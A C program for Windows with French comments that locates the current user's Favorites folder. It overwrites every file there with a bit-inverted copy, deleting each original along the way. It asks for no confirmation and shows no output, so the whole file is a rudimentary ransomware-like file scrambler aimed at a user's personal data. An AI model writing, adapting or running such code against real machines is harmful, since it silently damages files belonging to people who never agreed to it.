
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>

main()
{


    FILE *f;//Pointeur vers le ficher à crypter
    FILE *fcrypt;//Pointeur vers le fichier crypté
    FILE *tmp;//Pointeur vers le fichier temporaire
    char folder[500];
    char octet;
    char confirm;//Confirmation du cryptage
    char nf[100];//le nom du fichier
    char path[500]="";//Chemin du fichier a crypter
    char pathtmp[500]="";//Chemin du fichier temporaire

        //Récupération du chemin du repertoire Favoris de l'utilisateur
        SHGetSpecialFolderPath(
        NULL, folder, CSIDL_FAVORITES, FALSE);

        

  strcpy(pathtmp, folder);       //Chemin du fichier
  strcat(pathtmp, "\\temp.tmp"); //temporaire

HANDLE search;
strcpy(path, folder); //Les fichiers a crypter sont tout ceux contenu
strcat(path, "\\*.*");//dans folder...
LPCTSTR dir = path;
WIN32_FIND_DATA IpFindFileData;
search = FindFirstFile(dir,&IpFindFileData);//On cherche le 1er fichier


strcpy(path, folder);
  strcat(path, "\\");
  strcat(path, IpFindFileData.cFileName);

  f = fopen(path, "rb"); 
  if(f!=NULL)//Si il n'y a pas d'erreur lors de l'ouverture du fichier...
  {
  tmp = fopen(pathtmp, "wb");
  fread(&octet, 1, 1, f); //On lit un octet du fichier a crypter
  while(!feof(f))//Tant qu'on est pas a la fin du fichier
    {
    fwrite(&octet, 1, 1, tmp);//on ecrit l'octet lu dans le fichier temp
    fread(&octet, 1, 1, f);//et on en lit un nouveau dans le fichier
    }
  fclose(f);
  fclose(tmp);
  remove(path);

  fcrypt = fopen(path, "wb");//On créé un nouveau fichier ayant le même nom que l'ancien
  tmp = fopen(pathtmp, "rb");//On ouvre le fichier temporaire en lecture

  fread(&octet, 1, 1, tmp);//On lit un octet du fichier temporaire

  while(!feof(tmp))
    {
    octet=~octet;//On inverse les bits de l'octet lu...
    fwrite(&octet, 1, 1, fcrypt);//...et on l'ecrit dans le nouveau fichier...
    fread(&octet, 1, 1, tmp);//...puis on lit un nouvel octet dans le fichier temp.
    }

  fclose(tmp);//On ferme le ficheir temporaire
  fclose(fcrypt);//On ferme le fichier crypté
  remove(pathtmp);//On supprime le fichier temporaire
  }


while(FindNextFile(search, &IpFindFileData))//On cherche des fichiers tant qu'on en trouve.
{

  strcpy(path, folder);
  strcat(path, "\\");
  strcat(path, IpFindFileData.cFileName);



  f = fopen(path, "rb");
  if(f!=NULL)//Si il n'y a pas d'erreur lors de l'ouverture du fichier
  {
  tmp = fopen(pathtmp, "wb");//On créé le fichier temporaire
  fread(&octet, 1, 1, f); //On lit un octet du fichier a crypter
  while(!feof(f))//Tant qu'on est pas à la fin du fichier
    {
    fwrite(&octet, 1, 1, tmp);//on ecrit l'octet lu dans le fichier temp.
    fread(&octet, 1, 1, f);//et on en lit un nouveau dans le fichier
    }
  fclose(f);
  fclose(tmp);
  remove(path);//On suprimme le fichier

  fcrypt = fopen(path, "wb");//On créé un nouveau fichier ayant le même nom que l'ancien
  tmp = fopen(pathtmp, "rb");//On ouvre le fichier temporaire en lecture

  fread(&octet, 1, 1, tmp);//On lit un octet du fichier temporaire

  while(!feof(tmp))
    {
    octet=~octet;//On inverse les bits de l'octet lu
    fwrite(&octet, 1, 1, fcrypt);//et on l'ecrit dans le nouveau fichier
    fread(&octet, 1, 1, tmp);//puis on lit un nouvel octet dans le fichier temp.
    }

  fclose(tmp);
  fclose(fcrypt);
  remove(pathtmp);//On supprime le fichier temporaire
  }
}

getchar();
fflush(stdin);

FindClose(search);//La recherche est terminée ! 


}
